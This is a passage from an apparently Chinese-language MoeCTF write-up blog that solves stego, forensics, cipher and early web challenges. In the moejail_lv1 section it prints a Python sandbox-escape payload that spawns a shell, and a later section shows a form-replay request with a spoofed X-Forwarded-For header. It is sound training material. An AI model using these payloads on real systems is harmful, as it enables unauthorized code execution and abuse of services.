class="line">a!&#123;ivlotzkEm&#123;CtsvEpbDkwexsotyMuECs!mvlhmenrhwpMh0leydsMbC#CC&#125;sii&#125;tkb&#125;ugCD&#123;zlEeT#kyC0fbukglpopmaekbEthmjcMdsgkvmTnC&#125;eot#dcf&#123;ec@ccgqpfqMycysMuuou!en#&#123;g0cDmoyxTCMgt&#123;joT&#123;jnl0rhoklCe&#123;n0CnxprydeaTg0r&#123;avkEjckjEsxhaohs&#123;Trbkr!ffqip444uwrc&#125;nnevgtCT&#123;jCipogtipzdeDiqsy44rMfj&#123;MzCw#qwg&#123;T4m&#123;cuk!hwuncxdmddeurtsojakrjC#vTDd&#125;0poTT@c!DftjwuDp@mcuheeDtfao!iEcEq&#125;kcf#Mpcam&#123;mml4i4mpDnedamcwtC0nem&#123;mDotnmp4jf@TpxfqMoiqwtdijDfimmCzmxe#gsTu&#123;poeTEhD!u0anvTTTbbi&#123;q&#125;zapcksMifDlovoeac@&#123;0keh0dg&#123;Mi!@tfftqitmuMoMcuTpmcgnmozyrrv#zfmzmetyxxa0wczE&#125;eoD&#123;xcMnoCuebu0otdusiDknfvo0&#123;fEsMftzT!eoslegbypspC4vkxm#uaf@acuemhMyiDou#at0rfl4a&#125;0ixeEktws&#125;pMCfCigaTafg&#125;ffssmwwuTkTuls0&#123;M@c4e@&#123;D&#123;tuorzmyqptChpngkeCohCCMTwqctinc0mcjemclv@cMoqf00poarte@oqmuysm#mo&#123;et4kcCpcgcT&#125;vD&#125;m!g4&#123;E0!Mol0fpo!&#123;srT0pf&#123;cMuCx0bp&#123;ftTmExcrn&#125;0etonez!@C4tfa4aM00siztb@fomfD#&#123;#tMbo@jgb4CM0dEk0tea4aMCafn</span><br></pre></td></tr></table></figure><p><code>many</code>，直接联想到词频统计<br /><code>moectf&#123;C0pMuTaskingD4rE&#125;!vlzbwxyhd#j@q</code><br />调整<br /><code>moectf&#123;C0MpuTaskingD4rE&#125;</code><br />这<code>flag</code>意思怪怪的</p><h2 id="abnormal-lag"><a class="markdownIt-Anchor" href="#abnormal-lag"></a> Abnormal lag</h2><p>小听一下，豪庭，头尾肯定藏了东西<br /><code>Audacity</code>查看频谱图，横着读<br /><code>moectf&#123;09e3f7f8-c970-4c71-92b0-6f03a677421a&#125;</code></p><h2 id="ez_f5"><a class="markdownIt-Anchor" href="#ez_f5"></a> ez_F5</h2><p><code>F5</code>隐写，查看图片属性备注拿到密码<br /><code>java Extract suantouwangba.jpg -p no_password</code></p><h2 id="moejail_lv1"><a class="markdownIt-Anchor" href="#moejail_lv1"></a> moejail_lv1</h2><p><code>help()</code>能用，但是<code>!sh</code>无法进入交互<br /><code>base</code>好像不行，<code>popen</code>也用不了，不能进入交互页面，而且<code>flag</code>还藏的这么深</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-1].__subclasses__()[155].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span></span><br><span class="line">找到</span><br><span class="line">/tmp/.therealflag_7930f4a214d11cc8e1fe3d2691e18ae167f16d8abb646cc880b8ddd79b1de22938e2162129ab7f04cb93c8b77ce0d2eda3ca6ca7dec2ddfdc3bc3bbd6a23a50d  -</span><br><span class="line">通配符匹配出来</span><br><span class="line"><span class="built_in">cat</span> /tmp/.*</span><br></pre></td></tr></table></figure><h2 id="the-upside-and-down"><a class="markdownIt-Anchor" href="#the-upside-and-down"></a> The upside and down</h2><p><code>010</code>查看16进制，发现是<code>png</code>的倒序<br />厨子导入文件<br /><img src="https://picx.zhimg.com/80/v2-39b6b2efa4c1ac96de78bb3aef115bbb_1440w.png" alt="" /><br />保存扫码</p><h2 id="ctfer20771"><a class="markdownIt-Anchor" href="#ctfer20771"></a> ctfer2077①()</h2><p>扫码<code>Do you want to get the flag?Please enjoy the video:BV1hThreMEyT BV1hThreMEyT</code>很明显是<code>B站</code>的视频，打开，再去下面的视频链接，下载视频<br />没思路了</p><h2 id="ez_usbpcap"><a class="markdownIt-Anchor" href="#ez_usbpcap"></a> ez_usbpcap()</h2><p>过滤<code>usb.src==2.1.1</code>，导出特定分组<br /><code>tshark -r xxx.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' &gt; usbdata.txt</code><br />数据不带冒号</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">             <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;usbdata.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&quot;02&quot;</span>:</span><br><span class="line">            output += shiftKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += normalKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure><p>好，也是卡住了</p><h2 id="捂住一只耳"><a class="markdownIt-Anchor" href="#捂住一只耳"></a> 捂住一只耳</h2><p><code>63 31 43 31 41 52 31 51 71 101</code><br />翻了一下<code>hint</code><br />对应标准<code>qwe</code>键盘坐标，不过这里纵坐标在前，可以根据<code>101</code>推断出来<br /><code>moectf&#123;nevergetup&#125;</code></p><h2 id="readme"><a class="markdownIt-Anchor" href="#readme"></a> readme()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">😋 Welcome to the veryveryveryveryveryveryveryvery simple challenge! If your terminal DO NOT support unicode, it may be messed up!</span><br><span class="line">🥳 You got a free hint!</span><br><span class="line">--------------------------------------------------</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;/tmp/therealflag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">the_real_flag = fd.read().strip() <span class="comment"># u can&#x27;t catch me, i am ________</span></span><br><span class="line">os.system(<span class="string">&quot;rm /tmp/therealflag&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params"><span class="built_in">input</span>, <span class="built_in">print</span></span>) -&gt; NoReturn:</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># not implemented yet</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># not implemented yet</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure><p>这里放了个题，还没打，结束了都还没看。。。</p><h2 id="每人至少300份"><a class="markdownIt-Anchor" href="#每人至少300份"></a> 每人至少300份</h2><p>我的<code>imagemagick</code>出了点问题。。。<br />拼<code>3x3</code><a href="http://zuohaotu.com/image-merge.aspx">http://zuohaotu.com/image-merge.aspx</a><br /><code>gaps run ./flag.png newflag.png --generations=20 --population=200 --size=106</code><br />得到<code>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key&#123;3FgQG9ZFteHzw7W42&#125;??</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">self_encoding</span>(<span class="params">input_text</span>):</span><br><span class="line">    code_setting_first = <span class="string">&quot;doanythingfryuienbcjklmqpsw&quot;</span></span><br><span class="line">    encoded_text = <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> input_text:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> code_setting_first:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(x) &lt; <span class="number">104</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) + <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                encoded_text += x + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">ord</span>(x) &gt; <span class="number">115</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) - <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                encoded_text += x + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="number">104</span> &lt;= <span class="built_in">ord</span>(x) &lt;= <span class="number">115</span>:</span><br><span class="line">                num = <span class="number">219</span> - <span class="built_in">ord</span>(x)</span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                encoded_text += x + <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line">    number_setting = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_text)):</span><br><span class="line">        <span class="keyword">if</span> input_text[i] <span class="keyword">in</span> number_setting:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="built_in">len</span>(input_text) - <span class="number">1</span>:</span><br><span class="line">                x = <span class="built_in">int</span>(input_text[i]) ^ <span class="built_in">int</span>(input_text[i+<span class="number">1</span>])</span><br><span class="line">                encoded_text += <span class="built_in">str</span>(x) + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="keyword">elif</span> i == <span class="built_in">len</span>(input_text) - <span class="number">1</span>:</span><br><span class="line">                encoded_text += input_text[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> encoded_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_encoding</span>(<span class="params">input_text</span>):</span><br><span class="line">    output_text = input_text[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> output_text</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;main函数看个大概流程奥 uu们&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_text = <span class="string">&quot;blblbblblblbbl&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(reverse_encoding(self_encoding(input_text)))</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoded.txt</span></span><br><span class="line"><span class="number">7</span> <span class="number">3</span> <span class="number">5</span> d l i a h i r y</span><br><span class="line"><span class="number">6</span> <span class="number">5</span> <span class="number">1</span> d l i w m l v x h</span><br><span class="line"><span class="number">9</span> <span class="number">1</span> <span class="number">31</span> d l i w i r s a</span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line">firstrow147</span><br><span class="line">secondrow236</span><br><span class="line">thirdrow589</span><br><span class="line">函数逆出来之后，有点小误差，数字可以手动算出来，<span class="number">5</span>是矫正过的</span><br><span class="line">发现其实是二维码的拼接顺序。。。</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">self_decoding</span>(<span class="params">input_text</span>):</span><br><span class="line">    code_setting_first = <span class="string">&quot;doanythingfryuienbcjklmqpsw&quot;</span></span><br><span class="line">    decoded_text = <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> input_text:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> code_setting_first:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">115</span> &lt; <span class="built_in">ord</span>(x) &lt; <span class="number">123</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) - <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                decoded_text += x</span><br><span class="line">            <span class="keyword">elif</span> <span class="number">104</span> &gt; <span class="built_in">ord</span>(x) &gt; <span class="number">96</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) + <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                decoded_text += x</span><br><span class="line">            <span class="keyword">elif</span> <span class="number">104</span> &lt;= <span class="built_in">ord</span>(x) &lt;= <span class="number">115</span>:</span><br><span class="line">                num = <span class="number">219</span> - <span class="built_in">ord</span>(x)</span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                decoded_text += x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded_text</span><br></pre></td></tr></table></figure><p>尝试发现，是解<code>3FgQG9ZFteHzw7W42</code>的<code>base58</code>，然后套<code>flag</code>头</p><h2 id="the_secret_of_snowball"><a class="markdownIt-Anchor" href="#the_secret_of_snowball"></a> the_secret_of_snowball</h2><p>修改<code>jpg</code>文件头为<code>FF D8</code><br />图片，及文件末尾的隐藏内容解码得到<br /><code>moectf&#123;Welc0me_t0_the_secret_life_0f_Misc!&#125;</code></p><h2 id="find-it"><a class="markdownIt-Anchor" href="#find-it"></a> Find It</h2><p>有两个重点的地方<code>雄峰集团</code>，<code>桔子水晶酒店</code>，然后就看你用的哪个地图了<br />一开始找到了，但发现不对，又找了一圈，还是这个答案没错，但人家的念<code>di</code><br /><code>moectf&#123;ji_di_bao_you_er_yuan&#125;</code></p><h2 id="我的图层在你之上"><a class="markdownIt-Anchor" href="#我的图层在你之上"></a> 我的图层在你之上()</h2><p>没打</p><h2 id="解不完的压缩包"><a class="markdownIt-Anchor" href="#解不完的压缩包"></a> 解不完的压缩包</h2><p>找了个脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&#x27;C:\\Users\\27920\\Desktop\\moeCTF\\999.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> myzip:</span><br><span class="line">    myzip.extractall(<span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span>)</span><br><span class="line">zip_directory = <span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span></span><br><span class="line">zip_name = <span class="string">&#x27;999.zip&#x27;</span></span><br><span class="line">zipname = zip_directory+zip_name</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_directory+<span class="string">&#x27;\\&#x27;</span>+zip_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> myzips:</span><br><span class="line">        ls = myzips.namelist()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;.zip&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ls[<span class="number">0</span>]:</span><br><span class="line">            <span class="built_in">print</span>(zip_directory+<span class="string">&#x27;\\&#x27;</span>+zip_name)</span><br><span class="line">            myzips.extractall(<span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            myzips.extractall(<span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span>)</span><br><span class="line">            zip_name = <span class="built_in">str</span>(ls[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>得到<code>cccccccrc.zip</code><br />2字节(看的是原始大小)<code>CRC爆破</code><br /><a href="https://blog.csdn.net/mochu7777777/article/details/110206427">https://blog.csdn.net/mochu7777777/article/details/110206427</a><br />或者工具<a href="https://github.com/AabyssZG/CRC32-Tools">https://github.com/AabyssZG/CRC32-Tools</a><br />得到密码<code>*m:#P7j0</code>，打开即可得到<code>flag</code></p><h2 id="小小套娃"><a class="markdownIt-Anchor" href="#小小套娃"></a> 小小套娃()</h2><p>没打</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="web渗透测试与审计入门指北"><a class="markdownIt-Anchor" href="#web渗透测试与审计入门指北"></a> Web渗透测试与审计入门指北</h2><p>如见题目要求，用小皮本地启动即可</p><h2 id="弗拉格之地的入口"><a class="markdownIt-Anchor" href="#弗拉格之地的入口"></a> 弗拉格之地的入口</h2><p>爬虫<code>/robots.txt</code>，<code>/webtutorEntry.php</code></p><h2 id="垫刀之路01-moectf启动"><a class="markdownIt-Anchor" href="#垫刀之路01-moectf启动"></a> 垫刀之路01: MoeCTF？启动！</h2><p><code>cat /flag</code>失败，提示环境变量<code>env</code></p><h2 id="ez_http"><a class="markdownIt-Anchor" href="#ez_http"></a> ez_http</h2><p>先随便<code>post</code>应该<code>a=1</code>，不要点击按钮<br />然后就是基本的<code>GET POST Referer User-Agent Cookie X-Forwarded-For</code></p><h2 id="proveyourlove"><a class="markdownIt-Anchor" href="#proveyourlove"></a> ProveYourLove</h2><p>抓一个提交表单的数据包，其他全部放掉<br /><code>intruder</code>模块，选择数字，跑<code>300</code>次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /questionnaire HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:58028</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1:58028/</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 122</span><br><span class="line">Origin: http://127.0.0.1:58028</span><br><span class="line">Connection: close</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Priority: u=4</span><br><span class="line"></span><br><span 